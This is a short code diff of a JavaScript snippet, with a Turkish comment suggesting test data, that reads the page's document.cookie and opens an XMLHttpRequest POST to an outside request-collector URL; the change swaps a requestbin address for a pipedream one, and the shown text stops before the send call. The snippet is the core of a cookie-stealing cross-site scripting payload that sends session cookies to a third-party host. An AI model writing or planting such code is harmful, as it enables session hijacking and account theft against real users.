@@ -1,5 +1,5 @@
 var cookies = document.cookie;  // ya da istediğin test verisi
-var binUrl = "https://requestbin.com/r/abcd1234xyz";
+var binUrl = "https://eokl1lex271f1fe.m.pipedream.net";
 
 var xhr = new XMLHttpRequest();
 xhr.open("POST", binUrl, true);
